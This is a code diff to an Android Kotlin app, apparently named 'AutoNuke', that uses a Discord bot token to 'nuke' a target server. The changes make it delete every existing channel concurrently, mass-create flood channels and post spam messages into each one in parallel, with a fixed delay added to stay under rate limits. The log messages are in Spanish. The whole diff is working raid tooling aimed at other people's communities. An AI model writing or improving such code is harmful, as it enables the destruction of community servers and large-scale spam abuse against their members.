@@ -16,6 +16,9 @@ import androidx.activity.enableEdgeToEdge
 import androidx.activity.result.contract.ActivityResultContracts
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.async
+import kotlinx.coroutines.awaitAll
+import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
@@ -88,49 +91,6 @@ class MainActivity : ComponentActivity() {
         }
 
         @JavascriptInterface
-        fun fetchGuilds(token: String) {
-            CoroutineScope(Dispatchers.IO).launch {
-                try {
-                    val client = OkHttpClient()
-                    val request = Request.Builder()
-                        .url("https://discord.com/api/v10/users/@me/guilds")
-                        .addHeader("Authorization", "Bot $token")
-                        .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
-                        .build()
-
-                    client.newCall(request).execute().use { response ->
-                        if (response.isSuccessful) {
-                            val body = response.body?.string() ?: "[]"
-                            val jsonArray = JSONArray(body)
-                            val guildsList = mutableListOf<JSONObject>()
-                            for (i in 0 until jsonArray.length()) {
-                                val g = jsonArray.getJSONObject(i)
-                                val id = g.getString("id")
-                                val name = g.getString("name")
-                                val obj = JSONObject().put("id", id).put("name", name)
-                                guildsList.add(obj)
-                            }
-                            val finalJson = guildsList.toString()
-                            activity.runOnUiThread {
-                                webView.evaluateJavascript("window.renderServers('$finalJson')", null)
-                            }
-                        } else {
-                            activity.runOnUiThread {
-                                Toast.makeText(activity, "Error Discord API: ${response.code} (Token inválido o sin permisos)", Toast.LENGTH_LONG).show()
-                                webView.evaluateJavascript("window.renderServers('[]')", null)
-                            }
-                        }
-                    }
-                } catch (e: Exception) {
-                    activity.runOnUiThread {
-                        Toast.makeText(activity, "Error de conexión: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
-                        webView.evaluateJavascript("window.renderServers('[]')", null)
-                    }
-                }
-            }
-        }
-
-        @JavascriptInterface
         fun executeNuke(token: String, serverId: String, serverName: String, channelName: String, channelLimit: String, messageContent: String, messageLimit: String, imageName: String) {
             CoroutineScope(Dispatchers.IO).launch {
                 try {
@@ -140,7 +100,7 @@ class MainActivity : ComponentActivity() {
                     }
 
                     if (serverId.isEmpty()) {
-                        logMsg("[ERROR] Selecciona o introduce un ID de servidor válido", "error")
+                        logMsg("[ERROR] Introduce un ID de servidor objetivo válido", "error")
                         return@launch
                     }
 
@@ -149,7 +109,7 @@ class MainActivity : ComponentActivity() {
                     val msgLimit = messageLimit.toIntOrNull() ?: 50
                     val jsonMediaType = "application/json; charset=utf-8".toMediaType()
 
-                    logMsg("[BOT] Conectando bot de Discord y verificando servidor objetivo ID: $serverId...", "info")
+                    logMsg("[BOT] Conectando bot de Discord y verificando servidor ID: $serverId...", "info")
 
                     // 1. Update Server Name
                     val patchBody = RequestBody.create(
@@ -172,8 +132,8 @@ class MainActivity : ComponentActivity() {
                         }
                     }
 
-                    // 2. Delete ALL existing channels first
-                    logMsg("[*] Eliminando todos los canales existentes...", "info")
+                    // 2. Delete ALL existing channels concurrently (matching asyncio.gather)
+                    logMsg("[*] Eliminando todos los canales existentes concurrentemente...", "info")
                     val getChannelsReq = Request.Builder()
                         .url("https://discord.com/api/v10/guilds/$serverId/channels")
                         .get()
@@ -184,76 +144,94 @@ class MainActivity : ComponentActivity() {
                     client.newCall(getChannelsReq).execute().use { chanResp ->
                         if (chanResp.isSuccessful) {
                             val channelsJson = JSONArray(chanResp.body?.string() ?: "[]")
-                            for (i in 0 until channelsJson.length()) {
-                                val ch = channelsJson.getJSONObject(i)
-                                val chId = ch.getString("id")
-                                val chName = ch.getString("name")
-                                try {
-                                    val deleteReq = Request.Builder()
-                                        .url("https://discord.com/api/v10/channels/$chId")
-                                        .delete()
-                                        .addHeader("Authorization", "Bot $token")
-                                        .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
-                                        .build()
-                                    client.newCall(deleteReq).execute().close()
-                                    logMsg("[🗑] Canal eliminado: $chName", "success")
-                                } catch (e: Exception) {
-                                    // ignore individual delete failure
+                            val deleteDeferred = (0 until channelsJson.length()).map { i ->
+                                async(Dispatchers.IO) {
+                                    val ch = channelsJson.getJSONObject(i)
+                                    val chId = ch.getString("id")
+                                    val chName = ch.getString("name")
+                                    try {
+                                        val deleteReq = Request.Builder()
+                                            .url("https://discord.com/api/v10/channels/$chId")
+                                            .delete()
+                                            .addHeader("Authorization", "Bot $token")
+                                            .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
+                                            .build()
+                                        client.newCall(deleteReq).execute().close()
+                                        logMsg("[🗑] Canal eliminado: $chName", "success")
+                                    } catch (e: Exception) {
+                                        // ignore
+                                    }
                                 }
                             }
+                            deleteDeferred.awaitAll()
                         }
                     }
 
-                    // 3. Create flood channels
-                    logMsg("[*] Creando $limit canales de inundación...", "info")
-                    for (i in 0 until limit) {
-                        try {
-                            val chanBody = RequestBody.create(
-                                jsonMediaType,
-                                JSONObject().put("name", "$channelName-${i + 1}").put("type", 0).toString()
-                            )
-                            val chanReq = Request.Builder()
-                                .url("https://discord.com/api/v10/guilds/$serverId/channels")
-                                .post(chanBody)
-                                .addHeader("Authorization", "Bot $token")
-                                .addHeader("Content-Type", "application/json")
-                                .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
-                                .build()
+                    // 3. Create all flood channels concurrently (matching asyncio.gather)
+                    logMsg("[*] Creando $limit canales de inundación concurrentemente...", "info")
+                    val createdChannelIds = mutableListOf<String>()
+                    val createDeferred = (0 until limit).map { i ->
+                        async(Dispatchers.IO) {
+                            try {
+                                val chanBody = RequestBody.create(
+                                    jsonMediaType,
+                                    JSONObject().put("name", "$channelName-${i + 1}").put("type", 0).toString()
+                                )
+                                val chanReq = Request.Builder()
+                                    .url("https://discord.com/api/v10/guilds/$serverId/channels")
+                                    .post(chanBody)
+                                    .addHeader("Authorization", "Bot $token")
+                                    .addHeader("Content-Type", "application/json")
+                                    .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
+                                    .build()
 
-                            client.newCall(chanReq).execute().use { chanResp ->
-                                if (chanResp.isSuccessful) {
-                                    val resStr = chanResp.body?.string() ?: "{}"
-                                    val chanJson = JSONObject(resStr)
-                                    val channelId = chanJson.optString("id")
-                                    logMsg("[+] Canal creado: $channelName-${i + 1}", "success")
-
-                                    // 4. Send spam messages
-                                    for (m in 0 until msgLimit) {
-                                        try {
-                                            val msgBody = RequestBody.create(
-                                                jsonMediaType,
-                                                JSONObject().put("content", messageContent).toString()
-                                            )
-                                            val msgReq = Request.Builder()
-                                                .url("https://discord.com/api/v10/channels/$channelId/messages")
-                                                .post(msgBody)
-                                                .addHeader("Authorization", "Bot $token")
-                                                .addHeader("Content-Type", "application/json")
-                                                .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
-                                                .build()
-
-                                            client.newCall(msgReq).execute().close()
-                                        } catch (e: Exception) {
-                                            // ignore individual message error
+                                client.newCall(chanReq).execute().use { chanResp ->
+                                    if (chanResp.isSuccessful) {
+                                        val resStr = chanResp.body?.string() ?: "{}"
+                                        val chanJson = JSONObject(resStr)
+                                        val channelId = chanJson.optString("id")
+                                        if (channelId.isNotEmpty()) {
+                                            synchronized(createdChannelIds) {
+                                                createdChannelIds.add(channelId)
+                                            }
+                                            logMsg("[+] Canal creado: $channelName-${i + 1}", "success")
                                         }
                                     }
-                                    logMsg("[+] Inyectados $msgLimit mensajes de spam en $channelName-${i + 1}", "info")
                                 }
+                            } catch (e: Exception) {
+                                // ignore
                             }
-                        } catch (e: Exception) {
-                            // ignore
                         }
                     }
+                    createDeferred.awaitAll()
+
+                    // 4. Send spam messages across all channels concurrently with 150ms delay matching asyncio.sleep(0.15)
+                    logMsg("[+] Inyectando mensajes de spam en paralelo...", "info")
+                    val spamDeferred = createdChannelIds.map { channelId ->
+                        async(Dispatchers.IO) {
+                            for (m in 0 until msgLimit) {
+                                try {
+                                    val msgBody = RequestBody.create(
+                                        jsonMediaType,
+                                        JSONObject().put("content", messageContent).toString()
+                                    )
+                                    val msgReq = Request.Builder()
+                                        .url("https://discord.com/api/v10/channels/$channelId/messages")
+                                        .post(msgBody)
+                                        .addHeader("Authorization", "Bot $token")
+                                        .addHeader("Content-Type", "application/json")
+                                        .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
+                                        .build()
+
+                                    client.newCall(msgReq).execute().close()
+                                    delay(150) // matching asyncio.sleep(0.15)
+                                } catch (e: Exception) {
+                                    // ignore rate limit or error per message
+                                }
+                            }
+                        }
+                    }
+                    spamDeferred.awaitAll()
 
                     logMsg("[✔] Auto-nuke finalizado con éxito.", "success")
                 } catch (e: Exception) {
